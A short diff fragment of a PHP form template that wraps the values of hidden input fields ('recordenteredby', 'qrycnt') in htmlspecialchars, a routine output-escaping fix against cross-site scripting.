+												<input name="recordenteredby" type="hidden" value="<?php echo htmlspecialchars((string)($PARAMS_ARR['un']), ENT_QUOTES, 'UTF-8'); ?>" />
 												<button name="submitaction" type="submit" value="addOccurRecord" style="width:150px;font-weight:bold;margin:10px;"><?php echo $LANG['ADD_RECORD']; ?></button>
-												<input name="qrycnt" type="hidden" value="<?php echo $qryCnt?$qryCnt:''; ?>" />
+												<input name="qrycnt" type="hidden" value="<?php echo htmlspecialchars((string)($qryCnt?$qryCnt:''), ENT_QUOTES, 'UTF-8'); ?>" />
 												<div style="margin-left:15px;font-weight:bold;">
 													<?php echo $LANG['FOLLOW_UP']; ?>:
 												</div>
